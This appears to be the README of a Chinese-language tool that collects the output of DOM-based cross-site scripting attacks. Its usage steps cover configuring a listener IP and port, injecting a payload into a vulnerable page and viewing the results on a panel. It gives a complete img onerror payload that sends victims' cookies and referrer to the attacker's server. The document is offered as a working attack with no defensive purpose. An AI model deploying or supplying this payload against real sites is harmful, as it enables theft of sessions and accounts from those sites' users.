# DOM-XSS-Server
接收dom xss的平台

使用方法：

1. 修改tools配置文件

将host ip 修改为服务器网卡内网ip，端口也可以改成自己喜欢的

2. 构造payload

<img src=x onerror=document.location="//你的ip:你的端口/?".concat(document.cookie,"::",document.referrer)>

3. 将payload发送至存在漏洞处

4. 访问 你的ip:你的端口/xss 面板以获取到信息
